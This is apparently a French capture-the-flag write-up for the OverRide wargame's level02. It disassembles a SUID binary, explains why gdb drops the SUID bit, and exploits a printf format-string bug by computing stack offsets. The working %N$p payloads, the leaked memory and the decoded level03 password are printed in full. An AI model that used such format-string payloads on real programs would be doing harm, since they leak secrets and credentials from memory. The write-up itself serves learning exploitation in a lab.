```shell
./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: test
--[ Password: test
*****************************************
test does not have access!
```

## Analyse statique

Sous `gdb`, `info functions` fait ressortir la fonction `main`. On la désassemble et on la traduit en C.

Le binaire ouvre le fichier `/home/users/level03/.pass`, puis `fread` charge son contenu (41 octets) dans une variable **sur la pile**, à `rbp-0xa0` (`secret`). Aucun chiffrement n'est appliqué.

## Pourquoi gdb ne suffit pas (SUID)

Le binaire est **SUID level03**. Lancé sous gdb, il tourne avec notre propre identité (level02) : le noyau retire le bit SUID → l'euid redevient level02 → `fopen` sur le `.pass` de level03 renvoie NULL :

```shell
(gdb) r
Starting program: /home/users/level02/level02
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
ERROR: failed to open password file
[Inferior 1 (process 2173) exited with code 01]
```

Le programme part alors directement dans :

```c
if (fp == NULL) { fwrite(err); exit(1); }
```

Il quitte avant d'avoir chargé le secret. Donc sous gdb, `x/s $rbp-0xa0` donne une zone vide / des vieux octets : on ne lit jamais le vrai mot de passe par cette voie. Le secret n'existe en mémoire que lors d'une exécution normale (hors gdb), avec le SUID actif.

## La vulnérabilité : format string

Dans la branche d'échec, à la fin, on trouve `printf(buf)` **sans chaîne de format** (ligne +654, `0x400aa2`), où `buf` est notre saisie. C'est une vulnérabilité de format string classique. Le `secret` recherché étant sur la pile, on peut le lire avec des `%p`/`%s`/`%x` bien placés dans `buf`.

## Comment `%p` lit la pile

`printf` récupère ses arguments selon la convention System V AMD64 : les 5 premiers dans des registres (rsi, rdx, rcx, r8, r9), puis à partir du 6ᵉ **sur la pile**, depuis `rsp` vers le haut. Donc :

- `%1$p` … `%5$p` → registres (valeurs résiduelles, inutiles)
- `%6$p` → `[rsp]`, premier mot lu sur la pile
- ensuite chaque numéro +1 = +8 octets

Le prologue donne la position de `rsp` :


```shell
0x0000000000400814 <+0>:	push   %rbp
0x0000000000400815 <+1>:	mov    %rsp,%rbp
0x0000000000400818 <+4>:	sub    $0x120,%rsp
```

Donc **`rsp = rbp - 0x120`**, et l'adresse lue par `%N$p` (pour N ≥ 6) est :
​
```
adresse(%N$p) = rsp + (N-6)*8 = (rbp - 0x120) + (N-6)*8
  =>  N = 6 + (0x120 - offset_rbp) / 8
​```

On calcule les numéros des trois variables :

| Variable | Offset rbp | Calcul | `%N$p` |
|----------|-----------|--------|--------|
| `input` (mot de passe) | rbp-0x110 | 6 + (0x120-0x110)/8 = 6+2 | **%8** |
| `secret` | rbp-0xa0 | 6 + (0x120-0xa0)/8 = 6+16 | **%22** |
| `buf` (username) | rbp-0x70 | 6 + (0x120-0x70)/8 = 6+22 | **%28** |

On teste d'abord avec une valeur connue (le mot de passe `aaaa`), censée tomber en `%8` :

```shell
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: 1 %p 2 %p 3 %p 4 %p 5 %p 6 %p 7 %p 8 %p 9 %p 10 %p
--[ Password: aaaa
*****************************************
1 0x7fffffffe4c0 2 (nil) 3 0x61 4 0x2a2a2a2a2a2a2a2a 5 0x2a2a2a2a2a2a2a2a 6 0x7fffffffe6b8 7 0x1f7ff9a08 8 0x61616161 9 (nil) 10 (nil) does not have access!
```

`0x61616161` = `aaaa` apparaît bien au **8ᵉ** `%p` → le calcul est confirmé.

## Extraction du secret (%22 et suivants)

`secret` commence donc à `%22`. Le mot de passe fait ~40 caractères, soit, en 64 bits, au moins 5 qwords. On lit `%22$p` à `%28$p` :


```shell
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: aaaa %22$p %23$p %24$p %25$p %26$p %27$p %28$p
--[ Password: xxxx
*****************************************
aaaa 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x3232252061616161 does not have access!
```

## Décodage (little-endian)
```
0x756e505234376848 => Hh74RPnu
0x45414a3561733951 => Q9sa5JAE
0x377a7143574e6758 => XgNWCqz7
0x354a35686e475873 => sXGnh5J5
0x48336750664b394d => M9KfPg3H
```

Mot de passe de level03 :

​```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
​```


